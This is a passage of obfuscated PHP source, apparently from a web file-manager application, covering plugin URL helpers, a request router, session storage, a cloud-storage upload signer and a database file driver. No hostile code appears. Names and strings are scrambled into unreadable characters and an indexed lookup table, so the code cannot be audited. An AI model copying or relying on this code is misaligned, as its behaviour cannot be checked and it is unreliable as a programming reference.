$’ÉŸÕ½ê); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ùìè±²„); } public function onSetConfig($¡“®Çôé) { } public function onGetConfig($õ¶×Õı¤) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($÷—Ÿ‹•) { if ($÷—Ÿ‹• == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($’øƒüÇ = "\160\x6c\165\x67\151\156\x41\165\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $¡š‹†øà = $this->getConfig(); if (!$¡š‹†øà[$’øƒüÇ]) { return !1; } return ActionCall($_SERVER[¿ğÚ‰±–][1696], $¡š‹†øà[$’øƒüÇ]); } public function url($–¤Ê­Üü, $şúø…ö» = '', $¾½–ı›¥ = true) { $ğŸì­ =& $_SERVER[¿ğÚ‰±–]; $Êâ‚íé± = $this->getConfig(); $•·À¼ = KOD_VERSION . $ğŸì­[10] . KOD_VERSION_BUILD; $¥š…ÕØğ = $this->packageVersion(); $²êÀ­»” = $•·À¼ . $ğŸì­[462] . $¥š…ÕØğ; if (substr($–¤Ê­Üü, 0, 4) == $ğŸì­[152] || substr($–¤Ê­Üü, 0, 2) == $ğŸì­[1417]) { $ÙÕ¯‚£Ö = $–¤Ê­Üü . $ğŸì­[1697] . $²êÀ­»”; } else { if ($şúø…ö» == $ğŸì­[12]) { $ÙÕ¯‚£Ö = $this->pluginHost . $–¤Ê­Üü . $ğŸì­[1697] . $²êÀ­»”; } else { if ($şúø…ö» === $ğŸì­[78]) { $ÙÕ¯‚£Ö = $this->pluginHost . $–¤Ê­Üü; } else { if ($şúø…ö» == $ğŸì­[1698]) { $ÙÕ¯‚£Ö = STATIC_PATH . $–¤Ê­Üü . $ğŸì­[1697] . $•·À¼; } else { if ($şúø…ö» == $ğŸì­[1699]) { $ÙÕ¯‚£Ö = APP_HOST . $ğŸì­[1700] . $–¤Ê­Üü . $ğŸì­[1697] . $•·À¼; } else { if (isset($Êâ‚íé±[$şúø…ö»])) { $ÙÕ¯‚£Ö = $Êâ‚íé±[$şúø…ö»] . $–¤Ê­Üü . $ğŸì­[1697] . $²êÀ­»”; } } } } } } if (!$¾½–ı›¥) { return $ÙÕ¯‚£Ö; } echo $ÙÕ¯‚£Ö; } public function link($çÂÃ™Ö£ = false, $âÂõ Í = '') { $¥÷Ê‰Íš =& $_SERVER[¿ğÚ‰±–]; $¯şÔï§ = $this->linkHas == !1; $this->linkHas = !0; if (!$çÂÃ™Ö£) { $this->link($¥÷Ê‰Íš[1701], $¥÷Ê‰Íš[1699]); $this->link($¥÷Ê‰Íš[1702], $¥÷Ê‰Íš[1698]); $this->link($¥÷Ê‰Íš[1703], $¥÷Ê‰Íš[1698]); $this->link($¥÷Ê‰Íš[1704], $¥÷Ê‰Íš[1698]); $this->link($¥÷Ê‰Íš[1705], $¥÷Ê‰Íš[1698]); if ($¯şÔï§) { Hook::trigger($¥÷Ê‰Íš[1706]); } return; } $›¢«ªùÅ = $this->url($çÂÃ™Ö£, $âÂõ Í, !1); if (substr($çÂÃ™Ö£, -3) == $¥÷Ê‰Íš[1707]) { echo $¥÷Ê‰Íš[1708] . $›¢«ªùÅ . $¥÷Ê‰Íš[1709] . $¥÷Ê‰Íš[262]; } else { if (substr($çÂÃ™Ö£, -4) == $¥÷Ê‰Íš[1710]) { echo $¥÷Ê‰Íš[1711] . $›¢«ªùÅ . $¥÷Ê‰Íš[1712] . $¥÷Ê‰Íš[262]; } } if ($¯şÔï§) { Hook::trigger($¥÷Ê‰Íš[1706]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\133\136\x2f\135\x2b", "\72\156\x75\x6d" => "\133\x30\x2d\71\135\x2b", "\72\x61\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($ØÑŒ¬Øü, $˜Åı±öÍ) { $ô×ş÷şÇ =& $_SERVER[¿ğÚ‰±–]; if ($ØÑŒ¬Øü == $ô×ş÷şÇ[1713]) { $´‹ûøÓ = array_map($ô×ş÷şÇ[1714], $˜Åı±öÍ[0]); $®œÃĞ¼ = strpos($˜Åı±öÍ[1], $ô×ş÷şÇ[8]) === 0 ? $˜Åı±öÍ[1] : $ô×ş÷şÇ[8] . $˜Åı±öÍ[1]; $¯ßèÔö = $˜Åı±öÍ[2]; } else { $´‹ûøÓ = null; $®œÃĞ¼ = strpos($˜Åı±öÍ[0], $ô×ş÷şÇ[8]) === 0 ? $˜Åı±öÍ[0] : $ô×ş÷şÇ[8] . $˜Åı±öÍ[0]; $¯ßèÔö = $˜Åı±öÍ[1]; } array_push(self::$maps, $´‹ûøÓ); array_push(self::$routes, $®œÃĞ¼); array_push(self::$methods, strtoupper($ØÑŒ¬Øü)); array_push(self::$callbacks, $¯ßèÔö); } public static function error($¶ÙÉæ€Ü) { self::$errorCallback = $¶ÙÉæ€Ü; } public static function haltOnMatch($®š‰õ¯ = true) { self::$halts = $®š‰õ¯; } public static function dispatch() { $Êò¡Ÿ¥˜ =& $_SERVER[¿ğÚ‰±–]; $ñÍåÍ€ = parse_url($_SERVER[$Êò¡Ÿ¥˜[1715]], PHP_URL_PATH); $éÊ‚Ë›¿ = $_SERVER[$Êò¡Ÿ¥˜[164]]; $ƒøÛÏù” = array_keys(static::$patterns); $˜·À’© = array_values(static::$patterns); $ÃÆäïû· = !1; self::$routes = preg_replace($Êò¡Ÿ¥˜[1368], $Êò¡Ÿ¥˜[8], self::$routes); if (in_array($ñÍåÍ€, self::$routes)) { $Ÿß¼àúØ = array_keys(self::$routes, $ñÍåÍ€); foreach ($Ÿß¼àúØ as $øŸ‡Öšæ) { if (self::$methods[$øŸ‡Öšæ] == $éÊ‚Ë›¿ || self::$methods[$øŸ‡Öšæ] == $Êò¡Ÿ¥˜[1716] || in_array($éÊ‚Ë›¿, self::$maps[$øŸ‡Öšæ])) { $ÃÆäïû· = !0; if (!is_object(self::$callbacks[$øŸ‡Öšæ])) { $×Íèí = explode($Êò¡Ÿ¥˜[8], self::$callbacks[$øŸ‡Öšæ]); $²Ñ¢Òşı = end($×Íèí); $Êë„íãí = explode($Êò¡Ÿ¥˜[1300], $²Ñ¢Òşı); $­£³‹ğÜ = new $Êë„íãí[0](); $­£³‹ğÜ->{$Êë„íãí[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$øŸ‡Öšæ]); if (self::$halts) { return; } } } } } else { $±ü÷îĞÓ = 0; foreach (self::$routes as $øŸ‡Öšæ) { if (strpos($øŸ‡Öšæ, $Êò¡Ÿ¥˜[4]) !== !1) { $øŸ‡Öšæ = str_replace($ƒøÛÏù”, $˜·À’©, $øŸ‡Öšæ); } if (preg_match($Êò¡Ÿ¥˜[1717] . $øŸ‡Öšæ . $Êò¡Ÿ¥˜[1718], $ñÍåÍ€, $ˆåØ¯õ©)) { if (self::$methods[$±ü÷îĞÓ] == $éÊ‚Ë›¿ || self::$methods[$±ü÷îĞÓ] == $Êò¡Ÿ¥˜[1716] || !empty(self::$maps[$±ü÷îĞÓ]) && in_array($éÊ‚Ë›¿, self::$maps[$±ü÷îĞÓ])) { $ÃÆäïû· = !0; array_shift($ˆåØ¯õ©); if (!is_object(self::$callbacks[$±ü÷îĞÓ])) { $×Íèí = explode($Êò¡Ÿ¥˜[8], self::$callbacks[$±ü÷îĞÓ]); $²Ñ¢Òşı = end($×Íèí); $Êë„íãí = explode($Êò¡Ÿ¥˜[1300], $²Ñ¢Òşı); $­£³‹ğÜ = new $Êë„íãí[0](); if (!method_exists($­£³‹ğÜ, $Êë„íãí[1])) { echo $Êò¡Ÿ¥˜[1719]; } else { call_user_func_array(array($­£³‹ğÜ, $Êë„íãí[1]), $ˆåØ¯õ©); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$±ü÷îĞÓ], $ˆåØ¯õ©); if (self::$halts) { return; } } } } $±ü÷îĞÓ++; } } if ($ÃÆäïû· == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $™³Ó—Ó =& $_SERVER[¿ğÚ‰±–]; header($_SERVER[$™³Ó—Ó[1720]] . $™³Ó—Ó[1721]); echo $™³Ó—Ó[1722]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Êò¡Ÿ¥˜[1715]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ùó­’ß =& $_SERVER[¿ğÚ‰±–]; static $° ²†¾Ø = false; if ($° ²†¾Ø) { return $° ²†¾Ø; } $òÇÂå¤„ = $GLOBALS[$Ùó­’ß[6]][$Ùó­’ß[425]]; self::$sessionTime = $òÇÂå¤„[$Ùó­’ß[1723]]; $‹À²æç  = isset($GLOBALS[$Ùó­’ß[1724]]) ? $GLOBALS[$Ùó­’ß[1724]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($‹À²æç )) { self::$sessionSign = Cookie::get($‹À²æç ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($‹À²æç , self::$sessionSign, self::$sessionTime); $¬êœá„² = $òÇÂå¤„[$Ùó­’ß[1725]]; $…§€ªĞ– = $òÇÂå¤„[$¬êœá„²]; $¨Šáä¯ó = $òÇÂå¤„[$Ùó­’ß[905]]; switch ($¬êœá„²) { case $Ùó­’ß[21]: self::$handle = Model($Ùó­’ß[906]); break; case $Ùó­’ß[907]: self::$handle = new CacheRedis($…§€ªĞ–, $¨Šáä¯ó); break; case $Ùó­’ß[908]: self::$handle = new CacheMemcached($…§€ªĞ–, $¨Šáä¯ó); break; case $Ùó­’ß[230]: $…§€ªĞ–[$Ùó­’ß[87]] = $…§€ªĞ–[$Ùó­’ß[87]] . $Ùó­’ß[1726]; self::$handle = new CacheFile($…§€ªĞ–, $¨Šáä¯ó); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $° ²†¾Ø = new self(); return $° ²†¾Ø; } public static function getBySign($½­ˆòÚİ) { $¯ÄÈóî© = self::$handle->get($½­ˆòÚİ); $¯ÄÈóî© = unserialize($¯ÄÈóî©); return is_array($¯ÄÈóî©) ? $¯ÄÈóî© : array(); } public static function setBySign($Ïñœç€ç, $¿Ú÷©Æ) { CacheLock::lock($Ïñœç€ç); self::$handle->set($Ïñœç€ç, serialize($¿Ú÷©Æ), self::$sessionTime); CacheLock::unlock($Ïñœç€ç); } public static function sign($™‘æÀ“æ = false) { if ($™‘æÀ“æ) { self::$sessionSign = $™‘æÀ“æ; } self::init(); return self::$sessionSign; } public static function set($æ›ëè¬Ù, $®©øŞœ = false) { self::init(); if (is_array($æ›ëè¬Ù)) { foreach ($æ›ëè¬Ù as $ĞİŞœğ¢ => $š ü¥êš) { array_set_value(self::$data, $ĞİŞœğ¢, $š ü¥êš); } } else { array_set_value(self::$data, $æ›ëè¬Ù, $®©øŞœ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($œÇÒ´¯” = false) { self::init(); if (!$œÇÒ´¯”) { return self::$data; } return array_get_value(self::$data, $œÇÒ´¯”); } public static function remove($Æö¡¦Šß) { self::init(); unset(self::$data[$Æö¡¦Šß]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¿ğÚ‰±–][911])) { self::$handle->clearTimeout(); } } } goto F™Åà®Ù‰; F»šŠò”Œ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Äş·ã¶é) { parent::__construct($Äş·ã¶é); $this->setSignVersion($_SERVER[¿ğÚ‰±–][247]); } public function uploadFormData($¿Äç³šÏ, $ğªĞØ¾Õ = 3600) { $³á—¿Ğê =& $_SERVER[¿ğÚ‰±–]; $‚ÎõõËí = $³á—¿Ğê[229]; $¼ç™¹Œ = $³á—¿Ğê[263]; $ñ”«ß¯ñ = $³á—¿Ğê[274]; $Æô¿Çæ³ = gmdate($³á—¿Ğê[299], time() + $ğªĞØ¾Õ); $®ï„Úí = (string) time() . $³á—¿Ğê[74] . (string) (time() + $ğªĞØ¾Õ); $ ¢àçùÚ = array($³á—¿Ğê[275] => $Æô¿Çæ³, $³á—¿Ğê[278] => array(array($³á—¿Ğê[280] => $‚ÎõõËí), array($³á—¿Ğê[279] => $this->bucket), array($³á—¿Ğê[281], $³á—¿Ğê[282], $³á—¿Ğê[12]), array($³á—¿Ğê[285] => $ñ”«ß¯ñ), array($³á—¿Ğê[1418] => $¼ç™¹Œ), array($³á—¿Ğê[1419] => $this->accessKey), array($³á—¿Ğê[1420] => $®ï„Úí))); $ ¢àçùÚ = json_encode($ ¢àçùÚ); $£åÒÛôï = hash_hmac($³á—¿Ğê[263], $®ï„Úí, $this->secret); $”üÎÀ°Ş = sha1($ ¢àçùÚ); $§ÌÜ¡ø = hash_hmac($³á—¿Ğê[263], $”üÎÀ°Ş, $£åÒÛôï); $Àìõ¥şõ = array($³á—¿Ğê[280] => $‚ÎõõËí, $³á—¿Ğê[285] => $ñ”«ß¯ñ, $³á—¿Ğê[293] => base64_encode($ ¢àçùÚ), $³á—¿Ğê[1418] => $¼ç™¹Œ, $³á—¿Ğê[1419] => $this->accessKey, $³á—¿Ğê[1421] => $®ï„Úí, $³á—¿Ğê[1422] => $§ÌÜ¡ø, $³á—¿Ğê[208] => $this->getHost()); return $Àìõ¥şõ; } public function fileOutImage($¹äïÂü‡, $³™ø¼²ë = 250) { $ß†â­è² =& $_SERVER[¿ğÚ‰±–]; if ($this->size($¹äïÂü‡) > 1024 * 1024 * 32) { return $this->fileOutImageServer($¹äïÂü‡, $³™ø¼²ë); } $ËÕÆ‘°¼ = $this->link($¹äïÂü‡); $ËÕÆ‘°¼ .= $ß†â­è²[1423] . $³™ø¼²ë . $ß†â­è²[1424]; $this->fileOutLink($ËÕÆ‘°¼); } public function fileOutLink($–‡¸­‘) { $ºÂúÈÕ =& $_SERVER[¿ğÚ‰±–]; if (substr($–‡¸­‘, 0, 7) == $ºÂúÈÕ[313]) { $–‡¸­‘ = $ºÂúÈÕ[314] . substr($–‡¸­‘, 7); } header($ºÂúÈÕ[175] . $–‡¸­‘); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ôı´ş”) { $this->pathParse = $ôı´ş”; $this->model = Model($_SERVER[¿ğÚ‰±–][1425]); } public function getPath($û‘¹ú¢) { return trim($û‘¹ú¢, $_SERVER[¿ğÚ‰±–][8]); } public function pathFather($÷êÚìõ“) { $³èèîºø = $this->parse($÷êÚìõ“); $³èèîºø = $this->infoSimple($÷êÚìõ“); return $³èèîºø ? $³èèîºø[$_SERVER[¿ğÚ‰±–][192]] : !1; } public function pathThis($Ö¶½Ë§ë) { $áù¸ú¯ = $this->infoSimple($Ö¶½Ë§ë); return $áù¸ú¯ ? $áù¸ú¯[$_SERVER[¿ğÚ‰±–][32]] : !1; } public function getPathOuter($Ó­åŞ˜) { if (!$Ó­åŞ˜) { return $Ó­åŞ˜; } $øâ×ª†í = $this->parse($Ó­åŞ˜); return KodIO::make($øâ×ª†í[$_SERVER[¿ğÚ‰±–][475]]); } public function copyFolderFromIO($¡£È„Ï±, $çÚ›“µ´, $£‚È¢¸£, $™ÆÈğ è, $èÄÔñ½¿) { $™•¶¯‡õ = $this->model->copyFolderFromIO($¡£È„Ï±, $çÚ›“µ´, $£‚È¢¸£, $™ÆÈğ è, $èÄÔñ½¿); return KodIO::make($™•¶¯‡õ); } public function isParentOf($—ÑêÃÌ, $Ä§áÑÎ) { return $this->model->isParentOf($—ÑêÃÌ, $Ä§áÑÎ); } public function mkfile($œõìæš , $›Ü»Ì•ï = '', $â¢š¬êŞ = REPEAT_RENAME) { $ƒ£¡îÉ =& $_SERVER[¿ğÚ‰±–]; $ì‚É¾±Ï = $this->parse($œõìæš ); $œõìæš  = $ì‚É¾±Ï[$ƒ£¡îÉ[475]]; for ($éòûòœÚ = 0; $éòûòœÚ < count($ì‚É¾±Ï[$ƒ£¡îÉ[1426]]); $éòûòœÚ++) { $‰åËÊ”‹ = $ì‚É¾±Ï[$ƒ£¡îÉ[1426]][$éòûòœÚ]; if ($éòûòœÚ == count($ì‚É¾±Ï[$ƒ£¡îÉ[1426]]) - 1) { $œõìæš  = $this->model->mkfile($œõìæš , $‰åËÊ”‹, $›Ü»Ì•ï, $â¢š¬êŞ); break; } $œõìæš  = $this->model->mkdir($œõìæš , $‰åËÊ”‹, REPEAT_SKIP); } return $this->getPathOuter($œõìæš ); } public function mkdir($¶â§Í¾¾, $¥Ó€èêÅ = REPEAT_SKIP) { $†Øİ¢šÉ =& $_SERVER[¿ğÚ‰±–]; $Ôª°ËÙ = $this->parse($¶â§Í¾¾); $¶â§Í¾¾ = $Ôª°ËÙ[$†Øİ¢šÉ[475]]; for ($Ÿöœû±Ï = 0; $Ÿöœû±Ï < count($Ôª°ËÙ[$†Øİ¢šÉ[1426]]); $Ÿöœû±Ï++) { $Ç¦¦ßç® = $Ôª°ËÙ[$†Øİ¢šÉ[1426]][$Ÿöœû±Ï]; $¶â§Í¾¾ = $this->model->mkdir($¶â§Í¾¾, $Ç¦¦ßç®, $¥Ó€èêÅ); } return $this->getPathOuter($¶â§Í¾¾); } public function copyFile($¨ØË‘µ, $³ÏâÉÆ, $©üñãã° = REPEAT_REPLACE) { $› ½Ûóú =& $_SERVER[¿ğÚ‰±–]; $Ë‹ÌÑ¬â = $this->parse($³ÏâÉÆ); $´«ÆÊ¨Î = $this->model->copy($¨ØË‘µ, $Ë‹ÌÑ¬â[$› ½Ûóú[475]], $©üñãã°, $Ë‹ÌÑ¬â[$› ½Ûóú[87]]); return $´«ÆÊ¨Î ? $this->getPathOuter($´«ÆÊ¨Î) : !1; } public function moveFile($Ëã§ı‚×, $øÈ€“¯Ö, $’²µ¤ğê = REPEAT_REPLACE) { $¯¬îòõÛ =& $_SERVER[¿ğÚ‰±–]; $Á…ˆ¶—¯ = $this->parse($øÈ€“¯Ö); $ÛÚæ“Ö = $this->model->move($Ëã§ı‚×, $Á…ˆ¶—¯[$¯¬îòõÛ[475]], $’²µ¤ğê, $Á…ˆ¶—¯[$¯¬îòõÛ[87]]); return $ÛÚæ“Ö ? $this->getPathOuter($ÛÚæ“Ö) : !1; } public function copy($å˜õºÂĞ, $İ‰¦¦»Ô, $Éèã¾­ª = REPEAT_REPLACE, $†û†“ï = false) { $øá¸´ù§ = $this->parse($İ‰¦¦»Ô); $²¦íÕ¤ş = $this->model->copy($å˜õºÂĞ, $øá¸´ù§[$_SERVER[¿ğÚ‰±–][475]], $Éèã¾­ª, $†û†“ï); return $²¦íÕ¤ş ? $this->getPathOuter($²¦íÕ¤ş) : !1; } public function moveSameAllow() { } public function move($»Äƒ×Í’, $›“¥ìŸÆ, $à¦ùÅ’ñ = REPEAT_REPLACE, $ë³Ê“ĞÜ = false) { $şÂ½ªÁí = $this->parse($›“¥ìŸÆ); $ÈŞÅäˆ‡ = $this->model->move($»Äƒ×Í’, $şÂ½ªÁí[$_SERVER[¿ğÚ‰±–][475]], $à¦ùÅ’ñ, $ë³Ê“ĞÜ); return $ÈŞÅäˆ‡ ? $this->getPathOuter($ÈŞÅäˆ‡) : !1; } public function remove($òÇûİÊí, $›ÁŸÆÌ = true) { return $this->model->remove($òÇûİÊí, $›ÁŸÆÌ); } public function rename($ˆ”ÑÂÖ, $É¦Ç“€”) { $¡ù‚¢ãŠ = $this->model->rename($ˆ”ÑÂÖ, $É¦Ç“€”); return $¡ù‚¢ãŠ ? $this->getPathOuter($ˆ”ÑÂÖ) : $¡ù‚¢ãŠ; } public function size($Úâïïè) { $è² óÒó = $this->infoSimple($Úâïïè); return $è² óÒó ? $è² óÒó[$_SERVER[¿ğÚ‰±–][79]] : 0; } public function infoSimple($Ÿ¿¶÷») { return $this->model->sourceInfo($Ÿ¿¶÷»); } public function info($ğ•›•ş) { return $this->infoParse($ğ•›•ş); } public function infoAuth($®†»²³Ä) { return $this->infoParse($®†»²³Ä, !1, !0); } public function infoWithChildren($ øÊˆğ) { return $this->infoParse($ øÊˆğ, !0); } protected function infoParse($¿—×ßÎò, $Í³õí¼Å = false, $ÔÇ…˜¡Ö = false) { if (!$Í³õí¼Å) { return $this->model->pathInfo($¿—×ßÎò, $ÔÇ…˜¡Ö); } return $this->model->pathInfoMore($¿—×ßÎò); } public function infoFullSimple($ßç•ÁŞ) { $÷ÌÑ”¿° =& $_SERVER[¿ğÚ‰±–]; $³à½æ†ò = explode($÷ÌÑ”¿°[8], $ßç•ÁŞ); $„Ó€ùå = implode($÷ÌÑ”¿°[8], array_splice($³à½æ†ò, 1)); return $this->model->pathInfoByPath($³à½æ†ò[0], $„Ó€ùå); } public function infoFull($Ï¬¦¦Ï) { $×ÕışÁ¿ = $this->infoFullSimple($Ï¬¦¦Ï); return is_array($×ÕışÁ¿) ? $this->model->pathInfo($×ÕışÁ¿[$_SERVER[¿ğÚ‰±–][193]]) : !1; } public function hashSimple($„´±Œ‡) { $ôİÌ£Ú© =& $_SERVER[¿ğÚ‰±–]; $¬¸–Ğ„Ì = $this->infoWithChildren($„´±Œ‡); return $¬¸–Ğ„Ì[$ôİÌ£Ú©[170]][$ôİÌ£Ú©[672]]; } public function hashMd5($±‡ÒÚî”) { $Ô³â˜À =& $_SERVER[¿ğÚ‰±–]; $€Ë÷‚·ë = $this->infoWithChildren($±‡ÒÚî”); return $€Ë÷‚·ë[$Ô³â˜À[170]][$Ô³â˜À[547]]; } public function exist($”Ò¶¿¤Ç) { $ØŞ§Ù•à =& $_SERVER[¿ğÚ‰±–]; $íÕ«õŞğ = $this->parse($”Ò¶¿¤Ç); if (!$íÕ«õŞğ[$ØŞ§Ù•à[87]]) { return $this->isFile($”Ò¶¿¤Ç) || $this->isFolder($”Ò¶¿¤Ç); } $ñîşÔé = array($ØŞ§Ù•à[477] => $íÕ«õŞğ[$ØŞ§Ù•à[475]], $ØŞ§Ù•à[32] => $íÕ«õŞğ[$ØŞ§Ù•à[87]]); $ŒÑÔô²ï = $this->model->where($ñîşÔé)->find(); return $ŒÑÔô²ï ? !0 : !1; } public function isFile($ Ş€¹•î) { $»û£İå =& $_SERVER[¿ğÚ‰±–]; $¶µ¥ö÷» = $this->infoSimple($ Ş€¹•î); return $¶µ¥ö÷» && $¶µ¥ö÷»[$»û£İå[485]] == $»û£İå[228] ? !0 : !1; } public function isFolder($ïâ °òè) { $À¹âéÕŒ =& $_SERVER[¿ğÚ‰±–]; $â£¹çÑœ = $this->infoSimple($ïâ °òè); return $â£¹çÑœ && $â£¹çÑœ[$À¹âéÕŒ[485]] == $À¹âéÕŒ[91] ? !0 : !1; } public function listPath($öÕ‰ì¡ê, $ú…Õ£½¹ = false) { $ŠÄ›‚£ =& $_SERVER[¿ğÚ‰±–]; if ($öÕ‰ì¡ê == $ŠÄ›‚£[12]) { return !1; } $àÚØµü£ = array($ŠÄ›‚£[477] => $öÕ‰ì¡ê); if ($ú…Õ£½¹) { return $this->model->listSource($àÚØµü£, -1); } return $this->model->listSource($àÚØµü£); } public function has($Î¯‚—óá, $Î¶£„Íà = false, $¿Îœ¨¡« = null) { $Ûñ ïØø =& $_SERVER[¿ğÚ‰±–]; $ıËÖ“Ê = $this->infoWithChildren($Î¯‚—óá); if ($Î¶£„Íà) { return array($Ûñ ïØø[240] => $ıËÖ“Ê[$Ûñ ïØø[240]], $Ûñ ïØø[239] => $ıËÖ“Ê[$Ûñ ïØø[239]]); } return $¿Îœ¨¡« ? $ıËÖ“Ê[$Ûñ ïØø[240]] : $ıËÖ“Ê[$Ûñ ïØø[239]]; } public function listAll($°İôà¥Á) { $Æ¶€¥âü = IO::info($this->pathParse[$_SERVER[¿ğÚ‰±–][87]]); if (!$Æ¶€¥âü) { return array(); } return $this->model->listAll($°İôà¥Á); } public function getContent($ÓÛüô—) { return $this->model->getContent($ÓÛüô—); } public function setContent($õ¨øí¥ü, $´¢„º¨‡ = '') { return $this->model->setContent($õ¨øí¥ü, $´¢„º¨‡); } public function fileSubstr($ïËÂË‘, $…—‘¥¯, $„½½õêâ) { return $this->model->fileSubstr($ïËÂË‘, $…—‘¥¯, $„½½õêâ); } public function download($‘¸ĞşïŞ, $ä÷óÀ¡ = '') { $¾ôñÄáª = get_path_father($ä÷óÀ¡); $Ö¼¯ê¸± = get_path_this($ä÷óÀ¡); $”†Øµˆ• = $this->model->fileInfoGet($‘¸ĞşïŞ); $¢ÓÎ¯³ü = IO::copy($”†Øµˆ•[$_SERVER[¿ğÚ‰±–][87]], $¾ôñÄáª, !1, $Ö¼¯ê¸±); return $¢ÓÎ¯³ü; } public function setModifyTime($¡»ü‰šó, $áÙŠÑî = '') { $°ÁìûÏ =& $_SERVER[¿ğÚ‰±–]; if (!$¡»ü‰šó) { return; } $this->model->where(array($°ÁìûÏ[491] => $¡»ü‰šó))->save(array($°ÁìûÏ[88] => $áÙŠÑî)); } public function upload($ ·”¸¸, $ƒ­ÄÓº, $å½„À· = false, $À €ºÙë = REPEAT_REPLACE) { $‘ç×¢Ì =& $_SERVER[¿ğÚ‰±–]; $Ü®§…ô€ = $this->parse($ ·”¸¸); $êÄåÜ¦¡ = $this->model->addFile($Ü®§…ô€[$‘ç×¢Ì[475]], $ƒ­ÄÓº, $Ü®§…ô€[$‘ç×¢Ì[87]], $å½„À·, $À €ºÙë); return $this->getPathOuter($êÄåÜ¦¡); } public function uploadFileByID($ÃÖîÛ˜, $ìåİÓÚ‹, $¡Ì±¸») { $³»€ñÛ§ =& $_SERVER[¿ğÚ‰±–]; $»½‡ÅáÑ = $this->parse($ÃÖîÛ˜); $÷œæÀ…¨ = $this->model->addFileByFileID($»½‡ÅáÑ[$³»€ñÛ§[475]], $ìåİÓÚ‹, $»½‡ÅáÑ[$³»€ñÛ§[87]], $¡Ì±¸»); return $this->getPathOuter($÷œæÀ…¨); } public function addFileByRemote($õõ¥ ã¢, $ÂúêÉ…¼, $èÎÙºø· = array(), $ Òë¡„€ = '', $Ä«¬Ñü®) { $ÆÓŠô˜Û =& $_SERVER[¿ğÚ‰±–]; $–ê©ñ™± = $this->parse($õõ¥ ã¢); $ Òë¡„€ = empty($ Òë¡„€) ? $–ê©ñ™±[$ÆÓŠô˜Û[87]] : $ Òë¡„€; $äÒÀÄßÔ = $this->model->addFileByRemote($–ê©ñ™±[$ÆÓŠô˜Û[475]], $ÂúêÉ…¼, $ Òë¡„€, $èÎÙºø·, $Ä«¬Ñü®); return $this->getPathOuter($äÒÀÄßÔ); } public function uploadLink($äÈê”°­, $ ä–·±Í = 0) { $¬ûÑíî =& $_SERVER[¿ğÚ‰±–]; $Ø¤‚œ®„ = $this->parse($äÈê”°­); $¥§‚’½î = _get($GLOBALS[$¬ûÑíî[7]], $¬ûÑíî[1427]); $¬“ë = _get($GLOBALS[$¬ûÑíî[7]], $¬ûÑíî[1428]); $äÈê”°­ = Model($¬ûÑíî[674])->createFileName($Ø¤‚œ®„[$¬ûÑíî[87]], $¥§‚’½î, $¬“ë); return IO::uploadLink($äÈê”°­, $ ä–·±Í); } public function fileNameAuto($ıÏ ù“, $íÒ¿¼çî, $×ÕÔ¹££ = REPEAT_REPLACE, $ÚåÊÎ‚ = false) { return $this->model->fileNameAuto($ıÏ ù“, $íÒ¿¼çî, $×ÕÔ¹££, $ÚåÊÎ‚); } public function fileNameExist($´¿ŒâÈ›, $É‘´ÍåÛ) { return $this->model->fileNameExist($´¿ŒâÈ›, $É‘´ÍåÛ); } protected function _fileOut($±±õ‡ı, $Ò™ñ‡°Ø = false, $¢µåı„à = false, $÷·¤ˆ… = '', $Ù—àİ = false) { $¢Êƒ±º =& $_SERVER[¿ğÚ‰±–]; $ìü•¥› = $this->model->sourceInfo($±±õ‡ı); if ($ìü•¥›[$¢Êƒ±º[485]] == $¢Êƒ±º[91]) { header($¢Êƒ±º[1429]); die; } $Ç¾çÀÍ = $this->model->fileInfoGet($±±õ‡ı); $÷·¤ˆ… = $Ç¾çÀÍ[$¢Êƒ±º[547]] ? $Ç¾çÀÍ[$¢Êƒ±º[547]] : $÷·¤ˆ…; $ë•«Œ® = isset($GLOBALS[$¢Êƒ±º[182]]) && is_array($GLOBALS[$¢Êƒ±º[182]]) ? $GLOBALS[$¢Êƒ±º[182]][$¢Êƒ±º[32]] : $ìü•¥›[$¢Êƒ±º[32]]; if ($Ù—àİ) { return IO::fileOutServer($Ç¾çÀÍ[$¢Êƒ±º[87]], $Ò™ñ‡°Ø, $ë•«Œ®, $÷·¤ˆ…); } IO::fileOut($Ç¾çÀÍ[$¢Êƒ±º[87]], $Ò™ñ‡°Ø, $ë•«Œ®, $÷·¤ˆ…); } public function fileOut($ö½­Œõ¬, $ó¬Ìï‘ò = false, $öé›¡•æ = false, $´–å¼Ç¥ = '') { $this->_fileOut($ö½­Œõ¬, $ó¬Ìï‘ò, $öé›¡•æ, $´–å¼Ç¥); } public function fileOutServer($ª–ŠóÆÑ, $öÓ…¾„ş = false, $Òã€®Öœ = false, $¾÷À–• = '') { $this->_fileOut($ª–ŠóÆÑ, $öÓ…¾„ş, $Òã€®Öœ, $¾÷À–•, !0); } protected function _fileOutImage($ì¢ùúÁ, $Ğ®¶çƒ” = 250) { $¨¥Âƒ·œ =& $_SERVER[¿ğÚ‰±–]; $ü³¢î = $this->model->pathInfo($ì¢ùúÁ); if ($ü³¢î[$¨¥Âƒ·œ[485]] == $¨¥Âƒ·œ[91]) { 